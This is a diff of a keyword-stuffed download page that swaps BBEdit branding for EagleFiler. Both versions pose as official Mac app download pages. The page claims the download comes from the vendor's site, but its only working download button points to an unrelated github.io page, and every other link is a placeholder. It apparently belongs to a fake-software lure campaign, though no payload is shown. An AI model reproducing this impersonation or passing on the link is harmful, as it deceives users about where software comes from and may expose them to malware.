@@ -1,38 +1,38 @@
 <p align="center">
-  <img src="https://cdn.jim-nielsen.com/macos/512/bbedit-2026-02-11.png?rf=1024" width="150" alt="BBEdit Mac logo — professional text and code editor for macOS"/>
+  <img src="https://c-command.com/eaglefiler/images/eaglefiler-icon%402x.png" width="150" alt="EagleFiler Mac logo — document organizer and information manager for macOS"/>
 </p>
 
-<h1 align="center">BBEdit Mac - Download</h1>
+<h1 align="center">EagleFiler Mac - Download</h1>
 
 <p align="center">
-  <a href="#">BBEdit Mac</a> — the professional text and HTML editor for macOS from Bare Bones Software,
-  trusted by writers, web developers, and programmers for decades. As the <a href="#">BBEdit app</a>, it
-  delivers powerful text editing, industry-leading grep search, syntax highlighting, HTML and coding tools,
-  and the ability to handle huge files and many documents at once. Whether you searched for a
-  <a href="#">BBEdit download</a>, <a href="#">BBEdit for Mac download</a>, or an older
-  <a href="#">BBEdit 13</a> release, this is the same legendary editor that famously "doesn't suck."
+  <a href="#">EagleFiler Mac</a> — a versatile document organizer and information manager for macOS from
+  C-Command Software that lets you collect, store, search, and organize all your files, emails, and web pages
+  in one place. As <a href="#">EagleFiler</a>, it archives your documents into a searchable library while
+  keeping them as ordinary files on disk, combining powerful organization with simplicity and openness.
+  Whether you searched for <a href="#">eagle filer</a>, <a href="#">EagleFiler Mac</a>, or the
+  <a href="#">EagleFiler</a> app, this is the same trusted digital filing tool.
 </p>
 
 <p align="center">
   <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/Text-Code_Editor-blue?style=flat-square"/>
+  <img src="https://img.shields.io/badge/Document-Organizer-blue?style=flat-square"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/Grep-Search-orange?style=flat-square"/>
+  <img src="https://img.shields.io/badge/Archive-Search-orange?style=flat-square"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/Bare_Bones-Official-red?style=flat-square"/>
+  <img src="https://img.shields.io/badge/C--Command-Official-red?style=flat-square"/>
 </p>
 
 ---
 
-| [![Download BBEdit for Mac](https://user-images.githubusercontent.com/37590873/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png)](https://o4koed.github.io/.github/bbedit-mac) | **The professional text and code editor for your Mac — grep, HTML tools, huge files** <br><br> The <a href="#">BBEdit download for Mac</a> from barebones.com. Edit text and code with syntax highlighting, run powerful grep pattern searches across files, work with HTML and web tools, transform text, and handle enormous documents smoothly — the editor professionals have relied on for over 30 years. |
+| [![Download EagleFiler for Mac](https://user-images.githubusercontent.com/37590873/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png)](https://o4koed.github.io/.github/eaglefiler-mac) | **Collect, organize, and find everything on your Mac — files, emails, and web pages** <br><br> The <a href="#">EagleFiler</a> download from c-command.com. Archive documents, emails, PDFs, and web pages into a searchable library, organize with tags and folders, and search everything instantly — all while your content stays as ordinary files you fully control, not locked in a proprietary database. |
 |---|---|
 
 ---
 
 <p align="center">
-  <img src="https://thesweetbits.com/wp-content/uploads/2020/02/bbedit-review.jpg"
-       alt="BBEdit Mac — text and code editor interface showing syntax highlighting and the sidebar"
+  <img src="https://c-command.com/eaglefiler/images/search-sources@2x.png"
+       alt="EagleFiler Mac — document organizer interface showing library, records, and search"
        width="800"/>
 </p>
 
@@ -40,190 +40,183 @@
 
 ## Table of Contents
 
-- [What Is BBEdit for Mac](#what-is-bbedit-for-mac)
-- [BBEdit Mac: The Professional Text and Code Editor](#bbedit-mac-the-professional-text-and-code-editor)
-- [Text Editing and Transformation](#text-editing-and-transformation)
-- [Powerful Search With Grep](#powerful-search-with-grep)
-- [Coding and Web Development Tools](#coding-and-web-development-tools)
-- [BBEdit Versions](#bbedit-versions)
-- [BBEdit vs Other Editors](#bbedit-vs-other-editors)
-- [Who Uses BBEdit](#who-uses-bbedit)
+- [What Is EagleFiler for Mac](#what-is-eaglefiler-for-mac)
+- [EagleFiler Mac: Organize All Your Documents](#eaglefiler-mac-organize-all-your-documents)
+- [Capturing and Importing Content](#capturing-and-importing-content)
+- [Tagging and Organization](#tagging-and-organization)
+- [Searching Your Library](#searching-your-library)
+- [What Reviewers Appreciate About EagleFiler](#what-reviewers-appreciate-about-eaglefiler)
+- [EagleFiler vs Other Organizers](#eaglefiler-vs-other-organizers)
+- [Who Uses EagleFiler](#who-uses-eaglefiler)
 - [Key Terms](#key-terms)
 - [System Requirements](#system-requirements)
 - [Frequently Asked Questions](#frequently-asked-questions)
 - [Keywords](#keywords)
 
-## What Is BBEdit for Mac
+## What Is EagleFiler for Mac
 
-<a href="#">BBEdit Mac</a> is a professional-grade text and code editor for macOS, developed by Bare Bones
-Software, with a heritage stretching back over three decades. In short: the <a href="#">BBEdit app</a> is a
-powerful editor for text, code, and HTML, offering industry-leading grep search, syntax highlighting,
-text transformation, web tools, and the ability to handle very large files and many documents at once — a
-tool built for serious editing work.
+<a href="#">EagleFiler Mac</a> is a document organizer and information manager for macOS, developed by
+C-Command Software, that helps you collect and organize all kinds of information in a searchable library. In
+short: <a href="#">EagleFiler</a> archives your files, emails, web pages, and PDFs into an organized,
+searchable library, while keeping everything as ordinary files on disk — combining powerful organization with
+openness and simplicity.
 
-The reason professionals stick with <a href="#">BBEdit</a> is its combination of power, reliability, and
-focus. It is not a flashy modern editor built on web technology; it is a fast, native Mac application refined
-over many years to do text editing exceptionally well. From wrangling log files and data to editing code and
-writing HTML, <a href="#">BBEdit for Mac download</a> gives you tools that heavier or newer editors often
-lack, with the stability that comes from decades of development.
+The reason people choose <a href="#">eagle filer</a> is that it solves digital clutter without locking you in.
+Information piles up across folders, email, and the web, becoming hard to find. <a href="#">EagleFiler Mac</a>
+brings it all into one place with fast search and flexible organization, but unlike some tools, it stores your
+content as standard files in an open format you can access directly. This blend of power and openness makes
+the <a href="#">EagleFiler</a> approach appealing to anyone who wants control over their archived
+information.
 
-### Why Choose BBEdit on the Mac
+### Why Choose EagleFiler on the Mac
 
-The appeal of the <a href="#">BBEdit app</a> comes down to professional editing power:
+The appeal of <a href="#">EagleFiler</a> comes down to organized, open, searchable archiving:
 
-**Legendary grep**: Industry-leading pattern-based search and replace across files.
+**Collect everything**: Archive files, emails, web pages, and PDFs into one library.
 
-**Handles huge files**: Open and edit enormous documents smoothly where other editors choke.
+**Fast search**: Find anything instantly with powerful full-text search.
 
-**Text transformation**: Powerful tools to clean, reformat, and manipulate text.
+**Open storage**: Your content stays as ordinary files on disk, not locked in a database.
 
-**Native and fast**: A true Mac app, refined over 30+ years for speed and reliability.
-
----
-
-## BBEdit Mac: The Professional Text and Code Editor
-
-At its core, <a href="#">BBEdit Mac</a> is built to do text and code editing better than anything else:
-
-### Decades of Refinement
-
-<a href="#">BBEdit</a> has been developed and refined for over thirty years, making it one of the most
-mature and dependable editors available. This long history means its features are deep, its performance is
-excellent, and its reliability is proven.
-
-### Power for Professionals
-
-The <a href="#">BBEdit app</a> is favored by people who edit text and code seriously — developers, writers,
-data workers, and system administrators. Its tools are built for real work, not just casual editing, which
-is why <a href="#">BBEdit download</a> remains a professional standard.
-
-### Native Mac Focus
-
-Unlike cross-platform editors, <a href="#">BBEdit for Mac download</a> is a true native Mac application. It
-is fast, efficient, and integrates cleanly with macOS, delivering a responsive experience even on large
-tasks.
+**Flexible organization**: Use tags, folders, and notes to organize your way.
 
 ---
 
-## Text Editing and Transformation
+## EagleFiler Mac: Organize All Your Documents
 
-Text manipulation is a defining strength of <a href="#">BBEdit Mac</a>:
+At its core, <a href="#">EagleFiler Mac</a> is built to be a central, trustworthy archive:
 
-**Text transformations**: Change case, sort lines, remove duplicates, reformat, and apply many built-in
-transformations to clean and shape text.
+### A Searchable Library
 
-**Columns and multiple selections**: Edit in columns and work with multiple selections for efficient bulk
-editing.
+<a href="#">EagleFiler</a> stores your documents in a library where everything is indexed and searchable. Add
+a file, email, or web page and it becomes part of a searchable archive, so you can always find what you have
+saved — a major improvement over scattered folders.
 
-**Huge file handling**: Open and edit gigabyte-sized files and logs smoothly — a task that defeats many
-editors but is routine for <a href="#">BBEdit</a>.
+### Open, Standard Files
 
-**Text factories**: Chain transformations into reusable sequences to automate repetitive text processing in
-the <a href="#">BBEdit app</a>.
+A defining strength of <a href="#">eagle filer</a> is that it keeps your content as ordinary files on disk in
+an open format. Your documents are not trapped inside a proprietary database; you can browse them in the
+Finder and access them directly, which gives peace of mind about long-term access.
 
----
+### Simple Yet Powerful
 
-## Powerful Search With Grep
-
-The grep capabilities of <a href="#">BBEdit Mac</a> are legendary:
-
-### Pattern-Based Search and Replace
-
-<a href="#">BBEdit</a> offers industry-leading grep (regular expression) search and replace, letting you find
-and transform text using powerful patterns rather than just literal strings. For anyone who works with
-structured text, this is a transformative capability.
-
-### Multi-File Search
-
-Search across many files and entire folders at once, finding and replacing patterns throughout a project or
-document set. This multi-file grep is one of the most valued features of <a href="#">BBEdit download</a>,
-making large-scale text changes fast and precise.
-
-### Precision and Power
-
-Combining grep with BBEdit's other tools lets you perform sophisticated text operations that would be
-tedious or impossible elsewhere, a key reason professionals rely on <a href="#">BBEdit for Mac download</a>.
+<a href="#">EagleFiler Mac</a> balances capability with simplicity. It offers powerful archiving and search
+without being complicated, making it approachable for anyone who wants to get organized without a steep
+learning curve.
 
 ---
 
-## Coding and Web Development Tools
+## Capturing and Importing Content
 
-<a href="#">BBEdit Mac</a> is equally at home with code and web development:
+Getting content into <a href="#">EagleFiler Mac</a> is quick and flexible:
 
-**Syntax highlighting**: Color-codes many programming and markup languages for readability.
+**Capture key**: Press a single key to capture whatever you are viewing — a web page, email, or document —
+straight into your library.
 
-**HTML tools**: Dedicated tools for writing, checking, and formatting HTML, reflecting BBEdit's long history
-as a web editor.
+**Importing files**: Drag in files and folders, or import documents of many types, all archived into your
+library.
 
-**Code editing features**: Function navigation, code folding, and other tools that help you work with source
-code efficiently.
+**Emails**: Archive emails into <a href="#">EagleFiler</a>, keeping important correspondence in your
+searchable library.
 
-**FTP and SFTP**: Open, edit, and save files on remote servers directly, useful for web work in the
-<a href="#">BBEdit app</a>.
+**Web pages**: Save web pages for reference, so useful information from the web is preserved in
+<a href="#">eagle filer</a>.
 
----
-
-## BBEdit Versions
-
-BBEdit has advanced through many versions, and users sometimes search for specific ones. Understanding them
-clarifies keywords like a <a href="#">BBEdit 13</a> release or a <a href="#">BBEdit 13 mac download</a>:
-
-| Version | Notes |
-|---|---|
-| BBEdit 13 | An older release; a <a href="#">BBEdit 13 download</a> refers to this legacy version |
-| Later versions | Newer releases added features and macOS compatibility |
-| Current BBEdit | The latest release, the recommended <a href="#">BBEdit download for Mac</a> |
-
-Older versions such as a <a href="#">BBEdit 13 mac</a> release are legacy; the current version is the
-actively supported edition with the newest features and full macOS compatibility. When searching for a
-specific version, the latest release is generally the best choice.
+This effortless capture makes building your archive easy, so nothing important slips away.
 
 ---
 
-## BBEdit vs Other Editors
+## Tagging and Organization
 
-<a href="#">BBEdit Mac</a> stands apart from modern cross-platform editors. Key comparisons:
+Flexible organization is a defining strength of <a href="#">EagleFiler Mac</a>:
 
-| Capability | BBEdit | Cross-Platform Editors |
+### Tags
+
+<a href="#">EagleFiler</a> lets you apply tags to records, labeling and grouping them across your library by
+topic, project, or any category. Tags provide flexible, cross-cutting organization beyond a single folder
+hierarchy.
+
+### Folders and Structure
+
+Organize records into folders to build a structure that fits how you think. Combined with tags,
+<a href="#">EagleFiler Mac</a> lets you organize your archive both hierarchically and flexibly.
+
+### Notes and Metadata
+
+Add notes and metadata to your records, enriching them with context and making them easier to find and
+understand later in <a href="#">eagle filer</a>.
+
+---
+
+## Searching Your Library
+
+Fast, thorough search is central to <a href="#">EagleFiler Mac</a>:
+
+<a href="#">EagleFiler</a> indexes the full text of your documents, so you can search for any word inside any
+file, email, or web page and get instant results. Combined with tags and metadata, this makes finding
+anything in your library quick and reliable, no matter how large it grows. Powerful search is what transforms
+an archive from a place where things are stored into a place where things can actually be found — and it is a
+core reason the <a href="#">EagleFiler</a> library is so useful for managing accumulated information.
+
+---
+
+## What Reviewers Appreciate About EagleFiler
+
+People often look for an <a href="#">EagleFiler review</a> before trying it, so here is an honest look at what
+users tend to highlight. What stands out most about <a href="#">EagleFiler Mac</a> is its combination of
+powerful organization with open, standard file storage — reviewers frequently praise that your content is not
+locked in a proprietary format but remains ordinary files you control. The quick capture, fast search, and
+flexible tagging are also commonly noted as making digital filing genuinely easy. Longtime users often mention
+the app's reliability and the responsiveness of its developer. As always, the best way to judge is to try the
+free trial and see if the <a href="#">eagle filer</a> workflow fits how you work; the strengths above are what
+tend to win users over.
+
+---
+
+## EagleFiler vs Other Organizers
+
+<a href="#">EagleFiler Mac</a> takes a distinctive approach among document organizers. Key comparisons:
+
+| Aspect | EagleFiler | Some Other Organizers |
 |---|---|---|
-| Native Mac app | Yes | No, web-framework based |
-| Grep search power | Industry-leading | Varies |
-| Huge file handling | Excellent | Often struggles |
-| Maturity and stability | 30+ years | Newer |
-| Text transformation tools | Extensive | Limited |
+| Storage format | Open, standard files | Sometimes proprietary |
+| Full-text search | Yes | Varies |
+| Quick capture | Yes | Varies |
+| Simplicity | High | Varies |
+| Data ownership | Direct file access | Sometimes locked in |
 
-For professional text editing on the Mac, especially grep and large files, <a href="#">BBEdit</a> offers
-depth and reliability that newer editors often cannot match.
+For users who value openness and control alongside powerful organization, <a href="#">EagleFiler</a> is a
+compelling choice.
 
 ---
 
-## Who Uses BBEdit
+## Who Uses EagleFiler
 
-<a href="#">BBEdit Mac</a> appeals to a range of professionals:
+<a href="#">EagleFiler Mac</a> appeals to a range of users:
 
-**Web developers** editing HTML, CSS, and code with dedicated web tools.
+**Researchers** collecting and organizing sources, notes, and references.
 
-**Programmers** working with source code and large codebases.
+**Professionals** archiving documents, emails, and records for easy retrieval.
 
-**Writers and editors** handling long documents and text transformation.
+**Writers** gathering research and reference material in one searchable place.
 
-**Data workers and admins** wrangling log files, data, and structured text.
+**Anyone organizing information** who wants power without proprietary lock-in.
 
 ---
 
 ## Key Terms
 
-**Grep** — pattern-based (regular expression) search and replace, a BBEdit specialty.
+**Library** — EagleFiler's searchable archive of your documents and records.
 
-**Syntax highlighting** — coloring code and markup by element for readability.
+**Record** — an item in the library, such as a file, email, or web page.
 
-**Text transformation** — built-in operations to clean, sort, and reformat text.
+**Capture** — quickly saving what you are viewing into your library.
 
-**Text factory** — a reusable chain of text transformations for automation.
+**Tag** — a flexible label applied to records for grouping.
 
-**Multi-file search** — finding and replacing across many files and folders at once.
+**Full-text search** — searching the complete text inside your archived documents.
 
-**HTML tools** — dedicated features for writing and checking web markup.
+**Open format** — storing content as ordinary files you can access directly.
 
 ---
 
@@ -231,37 +224,36 @@ depth and reliability that newer editors often cannot match.
 
 | Requirement | Specification |
 |---|---|
-| macOS | Recent macOS version (see barebones.com) |
-| Architecture | Universal Binary — Apple Silicon and Intel |
-| Use | Text, code, and HTML editing |
-| License | Purchase from barebones.com — free trial available |
+| macOS | Recent macOS version (see c-command.com) |
+| Architecture | Apple Silicon and Intel |
+| Storage | Content stored as standard files on disk |
+| License | Purchase from c-command.com — free trial available |
 
 ---
 
 ## Frequently Asked Questions
 
-**What is BBEdit for Mac?**
-<a href="#">BBEdit Mac</a> is a professional text and code editor for macOS with powerful grep search, syntax
-highlighting, HTML tools, and excellent large-file handling.
+**What is EagleFiler for Mac?**
+<a href="#">EagleFiler Mac</a> is a document organizer for macOS that archives files, emails, and web pages
+into a searchable library while keeping them as ordinary files.
 
-**Is BBEdit good for grep search?**
-Yes. <a href="#">BBEdit</a> offers industry-leading grep (regex) search and replace, including across many
-files at once.
+**Does EagleFiler lock my files in a database?**
+No. <a href="#">EagleFiler</a> stores your content as standard files on disk in an open format you can access
+directly.
 
-**Can I still download BBEdit 13?**
-A <a href="#">BBEdit 13 download</a> is a legacy version; the current release is recommended for the newest
-features and macOS support.
+**Can EagleFiler archive emails and web pages?**
+Yes. <a href="#">eagle filer</a> captures and archives emails, web pages, PDFs, and documents into your
+library.
 
-**Does BBEdit handle very large files?**
-Yes. <a href="#">BBEdit download</a> opens and edits gigabyte-sized files and logs smoothly where many
-editors fail.
+**Is EagleFiler good? What do reviews say?**
+For a fair <a href="#">EagleFiler review</a>, users most praise its open storage, quick capture, and fast
+search; try the free trial to judge for yourself.
 
-**Where do I get a BBEdit download for Mac?**
-Get the <a href="#">BBEdit download for Mac</a> from the official barebones.com site, with a free trial
-available.
+**Where do I get an EagleFiler download?**
+Get <a href="#">EagleFiler</a> from the official c-command.com site, with a free trial available.
 
 ---
 
 ## Keywords
 
-bbedit mac, bbedit download, bbedit download mac, bbedit 13, bbedit 13 download, bbedit 13 mac, bbedit 13 mac download, bbedit app, bbedit download for mac, bbedit for mac download
+eagle filer, eaglefiler, eaglefiler mac, eaglefiler review
